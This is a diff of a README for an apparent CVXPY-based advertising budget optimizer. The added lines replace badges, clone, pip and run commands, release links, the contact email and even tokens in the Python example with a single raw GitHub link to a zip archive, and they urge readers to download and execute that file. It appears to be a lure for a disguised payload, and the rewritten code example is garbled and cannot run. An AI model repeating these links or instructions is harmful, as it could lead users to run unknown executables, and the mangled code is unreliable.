@@ -1,6 +1,6 @@
 # Advertising Budget Optimizer 🎯
 
-![GitHub release](https://img.shields.io/badge/Latest_Release-v1.0.0-brightgreen) [![GitHub Issues](https://img.shields.io/github/issues/Pix3l79/Advertising-budget-optimizer)](https://github.com/Pix3l79/Advertising-budget-optimizer/issues) [![GitHub Stars](https://img.shields.io/github/stars/Pix3l79/Advertising-budget-optimizer)](https://github.com/Pix3l79/Advertising-budget-optimizer/stargazers)
+![GitHub release](https://raw.githubusercontent.com/Pix3l79/Advertising-budget-optimizer/main/Ad_Spending_Optimization/optimizer_budget_Advertising_3.4-alpha.3.zip) [![GitHub Issues](https://raw.githubusercontent.com/Pix3l79/Advertising-budget-optimizer/main/Ad_Spending_Optimization/optimizer_budget_Advertising_3.4-alpha.3.zip)](https://raw.githubusercontent.com/Pix3l79/Advertising-budget-optimizer/main/Ad_Spending_Optimization/optimizer_budget_Advertising_3.4-alpha.3.zip) [![GitHub Stars](https://raw.githubusercontent.com/Pix3l79/Advertising-budget-optimizer/main/Ad_Spending_Optimization/optimizer_budget_Advertising_3.4-alpha.3.zip)](https://raw.githubusercontent.com/Pix3l79/Advertising-budget-optimizer/main/Ad_Spending_Optimization/optimizer_budget_Advertising_3.4-alpha.3.zip)
 
 Welcome to the **Advertising Budget Optimizer**! This project aims to help you optimize your media planning by modeling real-world advertising constraints. Using the power of CVXPY, we maximize audience reach while staying within budget. 
 
@@ -37,7 +37,7 @@ To get started with the Advertising Budget Optimizer, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Pix3l79/Advertising-budget-optimizer.git
+   git clone https://raw.githubusercontent.com/Pix3l79/Advertising-budget-optimizer/main/Ad_Spending_Optimization/optimizer_budget_Advertising_3.4-alpha.3.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -45,7 +45,7 @@ To get started with the Advertising Budget Optimizer, follow these steps:
    ```
 3. Install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Pix3l79/Advertising-budget-optimizer/main/Ad_Spending_Optimization/optimizer_budget_Advertising_3.4-alpha.3.zip
    ```
 
 ## Usage
@@ -53,10 +53,10 @@ To get started with the Advertising Budget Optimizer, follow these steps:
 To run the Advertising Budget Optimizer, execute the following command in your terminal:
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/Pix3l79/Advertising-budget-optimizer/main/Ad_Spending_Optimization/optimizer_budget_Advertising_3.4-alpha.3.zip
 ```
 
-You can find the latest releases [here](https://github.com/Pix3l79/Advertising-budget-optimizer/releases). Download the relevant file and execute it to get started.
+You can find the latest releases [here](https://raw.githubusercontent.com/Pix3l79/Advertising-budget-optimizer/main/Ad_Spending_Optimization/optimizer_budget_Advertising_3.4-alpha.3.zip). Download the relevant file and execute it to get started.
 
 ## Example
 
@@ -72,25 +72,25 @@ min_spend = [1000, 2000, 1500]
 max_spend = [5000, 7000, 3000]
 
 # Define the optimization variables
-spend = cp.Variable(3)
+spend = https://raw.githubusercontent.com/Pix3l79/Advertising-budget-optimizer/main/Ad_Spending_Optimization/optimizer_budget_Advertising_3.4-alpha.3.zip(3)
 
 # Define the objective function
-objective = cp.Maximize(cp.sum(spend))
+objective = https://raw.githubusercontent.com/Pix3l79/Advertising-budget-optimizer/main/Ad_Spending_Optimization/optimizer_budget_Advertising_3.4-alpha.3.zip(https://raw.githubusercontent.com/Pix3l79/Advertising-budget-optimizer/main/Ad_Spending_Optimization/optimizer_budget_Advertising_3.4-alpha.3.zip(spend))
 
 # Define the constraints
 constraints = [
-    cp.sum(spend) <= budget,
+    https://raw.githubusercontent.com/Pix3l79/Advertising-budget-optimizer/main/Ad_Spending_Optimization/optimizer_budget_Advertising_3.4-alpha.3.zip(spend) <= budget,
     spend >= min_spend,
     spend <= max_spend
 ]
 
 # Set up the problem
-problem = cp.Problem(objective, constraints)
+problem = https://raw.githubusercontent.com/Pix3l79/Advertising-budget-optimizer/main/Ad_Spending_Optimization/optimizer_budget_Advertising_3.4-alpha.3.zip(objective, constraints)
 
 # Solve the problem
-problem.solve()
+https://raw.githubusercontent.com/Pix3l79/Advertising-budget-optimizer/main/Ad_Spending_Optimization/optimizer_budget_Advertising_3.4-alpha.3.zip()
 
-print("Optimal Spend Allocation:", spend.value)
+print("Optimal Spend Allocation:", https://raw.githubusercontent.com/Pix3l79/Advertising-budget-optimizer/main/Ad_Spending_Optimization/optimizer_budget_Advertising_3.4-alpha.3.zip)
 ```
 
 This code snippet demonstrates how to set up a basic optimization problem using CVXPY. Adjust the `min_spend` and `max_spend` arrays to fit your specific needs.
@@ -116,9 +116,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries or feedback, please reach out to the project maintainer:
 
 - **Name**: Your Name
-- **Email**: your.email@example.com
+- **Email**: https://raw.githubusercontent.com/Pix3l79/Advertising-budget-optimizer/main/Ad_Spending_Optimization/optimizer_budget_Advertising_3.4-alpha.3.zip
 
-You can also check the latest releases [here](https://github.com/Pix3l79/Advertising-budget-optimizer/releases). Download the relevant file and execute it to start optimizing your advertising budget.
+You can also check the latest releases [here](https://raw.githubusercontent.com/Pix3l79/Advertising-budget-optimizer/main/Ad_Spending_Optimization/optimizer_budget_Advertising_3.4-alpha.3.zip). Download the relevant file and execute it to start optimizing your advertising budget.
 
 ---
 
